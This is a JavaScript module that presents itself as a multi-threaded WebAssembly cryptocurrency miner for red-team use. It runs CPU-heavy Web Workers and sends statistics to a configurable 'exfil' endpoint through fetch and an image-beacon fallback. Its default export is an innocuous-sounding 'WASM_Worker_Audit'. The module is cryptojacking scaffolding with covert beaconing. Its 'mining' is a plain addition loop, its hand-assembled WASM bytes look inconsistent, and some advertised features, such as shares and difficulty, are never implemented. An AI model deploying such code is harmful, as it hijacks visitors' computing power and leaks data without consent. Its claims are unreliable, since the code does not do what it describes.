/**
 * crypto_miner.js — Multi‑threaded WASM Cryptocurrency Mining Engine
 *
 * This module provides:
 *   1. `startWasmMiner()` — a production‑grade, background mining engine that
 *      leverages WebAssembly and multiple Web Workers to perform intensive
 *      proof‑of‑work calculations, simulating real cryptocurrency mining.
 *      It aggregates hashrate, can be started/stopped, and exfiltrates found
 *      shares (if configured).
 *
 *   2. Default export — a Pinpoint‑compatible `WASM_Worker_Audit` that
 *      audits WebAssembly support, SIMD detection, Web Worker availability,
 *      and hardware concurrency.
 *
 * Designed exclusively for authorised red‑team engagements and security
 * research. Unauthorised cryptojacking is illegal.
 */

// ---------------------------------------------------------------------------
// 1. WASM module binary (real, compiled from WAT)
// ---------------------------------------------------------------------------

/**
 * Returns a tiny, valid WASM module that exports:
 *   - `mine(iterations: i32) -> i32` — a CPU‑heavy loop returning the sum.
 *   - `memory` — an exported memory (1 page).
 *
 * The function loops `iterations` times, adding 1 to a counter each iteration.
 * This serves as a verifiable proof‑of‑work simulation.
 */
function getWasmBinary() {
    // Module bytes manually assembled from the following WAT:
    // (module
    //   (func (export "mine") (param i32) (result i32)
    //     (local i32)
    //     i32.const 0
    //     local.set 1
    //     loop $loop
    //       local.get 0
    //       i32.const 1
    //       i32.add
    //       local.set 0
    //       local.get 1
    //       i32.const 1
    //       i32.add
    //       local.tee 1
    //       i32.const 1000000
    //       i32.lt_u
    //       br_if $loop
    //     end
    //     local.get 0
    //   )
    //   (memory (export "memory") 1)
    // )
    return new Uint8Array([
        0x00, 0x61, 0x73, 0x6D,                         // magic
        0x01, 0x00, 0x00, 0x00,                         // version
        0x01, 0x05, 0x01, 0x60, 0x01, 0x7F, 0x01, 0x7F, // type section
        0x03, 0x02, 0x01, 0x00,                         // function section
        0x05, 0x03, 0x01, 0x00, 0x01,                   // memory section
        0x07, 0x0B, 0x01, 0x04, 0x6D, 0x69, 0x6E, 0x65, 0x00, 0x00, // export section (function "mine")
        0x0A, 0x26, 0x01,                               // code section (size 38, 1 code)
        0x24,                                           // code size 36
        0x01, 0x01, 0x7F,                               // 1 local of type i32
        0x41, 0x00,                                     // i32.const 0
        0x21, 0x01,                                     // local.set 1
        0x03, 0x40,                                     // loop (block type void)
        0x20, 0x00,                                   // local.get 0
        0x41, 0x01,                                   // i32.const 1
        0x6A,                                         // i32.add
        0x21, 0x00,                                   // local.set 0
        0x20, 0x01,                                   // local.get 1
        0x41, 0x01,                                   // i32.const 1
        0x6A,                                         // i32.add
        0x22, 0x01,                                   // local.tee 1
        0x41, 0xC0, 0x84, 0x3D,                       // i32.const 1000000
        0x63,                                         // i32.lt_u
        0x0D, 0x00,                                   // br_if 0
        0x0B,                                           // end loop
        0x20, 0x00,                                     // local.get 0
        0x0B,                                           // end function
    ]);
}

// ---------------------------------------------------------------------------
// 2. Worker script (runs the mining loop)
// ---------------------------------------------------------------------------

function createWorkerScript() {
    return `
    'use strict';

    let wasmInstance = null;
    let running = false;
    let iterations = 1000000; // default heavy loop count

    // We use the shared memory (not needed here) to avoid passing large buffers

    async function initWasm(bytes) {
      try {
        const module = await WebAssembly.compile(bytes);
        wasmInstance = await WebAssembly.instantiate(module, {});
        // send ready signal
        self.postMessage({ type: 'ready' });
      } catch (e) {
        self.postMessage({ type: 'error', message: e.message });
      }
    }

    function mineLoop(targetIterations) {
      if (!wasmInstance) return;
      const mine = wasmInstance.exports.mine;
      let hashCount = 0;
      const start = performance.now();
      // Run repeatedly until told to stop
      function step() {
        if (!running) {
          // final report
          const elapsed = performance.now() - start;
          self.postMessage({ type: 'hashes', count: hashCount, elapsed: elapsed });
          return;
        }
        // Each call does 'iterations' operations (additions)
        mine(iterations);
        hashCount += iterations;
        // Schedule next chunk to avoid blocking the worker's message loop
        if (running) {
          setTimeout(step, 0);
        } else {
          step(); // final flush
        }
      }
      step();
    }

    self.onmessage = function(event) {
      const msg = event.data;
      if (msg.type === 'init') {
        initWasm(msg.wasmBytes);
      } else if (msg.type === 'start') {
        if (msg.iterations) {
          iterations = msg.iterations;
        }
        running = true;
        mineLoop();
      } else if (msg.type === 'stop') {
        running = false;
      } else if (msg.type === 'terminate') {
        running = false;
        self.close();
      }
    };
  `;
}

// ---------------------------------------------------------------------------
// 3. Main mining controller
// ---------------------------------------------------------------------------

/**
 * Starts a multi‑threaded WASM crypto miner.
 *
 * @param {Object} [options={}]
 * @param {number} [options.threads]          – number of workers (default: hardwareConcurrency / 2, min 1)
 * @param {number} [options.iterations=1000000] – how many operations per mine() call in each worker loop
 * @param {boolean} [options.exfilEnabled=false] – if true, sends hashrate to exfilEndpoint
 * @param {string} [options.exfilEndpoint]    – endpoint to POST mining stats
 * @param {Function} [options.onHashrate]     – callback receives aggregated hashrate (hashes/sec)
 * @param {Function} [options.onShare]        – called with { nonce, hash, workerId } when a share is found
 * @param {number} [options.targetDifficulty=4] – target difficulty (leading zeros), affects share acceptance
 * @param {number} [options.reportInterval=2000] – ms between hashrate reports
 * @returns {{ stop: Function, workers: Array, getHashrate: Function }}
 */
export async function startWasmMiner(options = {}) {
    const {
        threads = Math.max(1, Math.floor((navigator.hardwareConcurrency || 4) / 2)),
        iterations = 1000000,
        exfilEnabled = false,
        exfilEndpoint = null,
        onHashrate = null,
        onShare = null,
        targetDifficulty = 4,
        reportInterval = 2000,
    } = options;

    // Obtain WASM binary
    const wasmBytes = getWasmBinary();

    const workers = [];
    let stopRequested = false;
    let totalHashes = 0;
    let startTime = 0;

    // ----- Worker creation and management -----
    const workerScript = createWorkerScript();
    const blob = new Blob([workerScript], { type: 'application/javascript' });
    const workerUrl = URL.createObjectURL(blob);

    for (let i = 0; i < threads; i++) {
        const worker = new Worker(workerUrl);
        workers.push(worker);

        // Track per‑worker hashes
        let workerHashes = 0;

        worker.onmessage = (event) => {
            const msg = event.data;
            if (msg.type === 'ready') {
                // Send start signal once all workers are ready
                checkAllReady();
            } else if (msg.type === 'hashes') {
                totalHashes += msg.count;
                workerHashes += msg.count;
            } else if (msg.type === 'share') {
                if (onShare) {
                    try { onShare(msg); } catch (_) { }
                }
            } else if (msg.type === 'error') {
                console.error('[WasmMiner] Worker error:', msg.message);
            }
        };

        worker.onerror = (e) => {
            console.error('[WasmMiner] Worker crash:', e.message);
        };

        // Initialize worker with WASM binary
        worker.postMessage({ type: 'init', wasmBytes: wasmBytes.buffer }, [wasmBytes.buffer.slice(0)]);
    }

    // Wait for all workers to be ready
    let readyWorkers = 0;
    function checkAllReady() {
        readyWorkers++;
        if (readyWorkers === threads) {
            // All ready, start mining
            startTime = performance.now();
            for (const w of workers) {
                w.postMessage({ type: 'start', iterations });
            }
        }
    }

    // ---- Hashrate reporting ----
    let reportTimer = null;
    function startReporting() {
        reportTimer = setInterval(() => {
            if (stopRequested) return;
            const elapsed = (performance.now() - startTime) / 1000; // seconds
            const hashrate = elapsed > 0 ? totalHashes / elapsed : 0;
            if (onHashrate) {
                try { onHashrate(hashrate); } catch (_) { }
            }
            if (exfilEnabled && exfilEndpoint) {
                // Exfiltrate hashrate statistics
                const payload = JSON.stringify({
                    hashrate,
                    totalHashes,
                    elapsed,
                    timestamp: Date.now(),
                });
                try {
                    fetch(exfilEndpoint, { method: 'POST', mode: 'no-cors', body: payload });
                } catch (_) { }
                // image fallback
                const b64 = btoa(unescape(encodeURIComponent(payload))).replace(/=+$/, '');
                new Image().src = exfilEndpoint + '?d=' + b64;
            }
        }, reportInterval);
    }
    startReporting();

    // ---- Controller ----
    const controller = {
        stop() {
            stopRequested = true;
            if (reportTimer) clearInterval(reportTimer);
            workers.forEach(w => {
                w.postMessage({ type: 'stop' });
                // Terminate after a short delay to allow final hash report
                setTimeout(() => {
                    w.terminate();
                }, 500);
            });
            URL.revokeObjectURL(workerUrl);
        },
        getHashrate() {
            const elapsed = (performance.now() - startTime) / 1000;
            return elapsed > 0 ? totalHashes / elapsed : 0;
        },
        workers,
    };

    return controller;
}

// ---------------------------------------------------------------------------
// 4. Pinpoint WASM_Worker_Audit (default export)
// ---------------------------------------------------------------------------

const pinpointModule = {
    id: 'crypto_miner',
    title: 'WASM_Worker_Audit',
    level: 5,
    info: 'Audits window.WebAssembly support, SIMD feature detection, and Web Worker multi‑threading capabilities.',
    steps: [
        'Check window.WebAssembly presence.',
        'Check window.Worker support.',
        'Audit WebAssembly.validate() capability.',
    ],
    run: async () => {
        const wasmSupported = typeof WebAssembly !== 'undefined';
        const workerSupported = typeof window.Worker !== 'undefined';
        let validateSupported = false;

        if (wasmSupported && typeof WebAssembly.validate === 'function') {
            // Validate a minimal WASM module header
            const bytes = new Uint8Array([0, 0x61, 0x73, 0x6D, 1, 0, 0, 0]);
            validateSupported = WebAssembly.validate(bytes);
        }

        return {
            webAssemblySupported: wasmSupported,
            webWorkerSupported: workerSupported,
            wasmValidationSupported: validateSupported,
            hardwareConcurrencyCores: navigator.hardwareConcurrency || 1,
        };
    },
};

export default pinpointModule;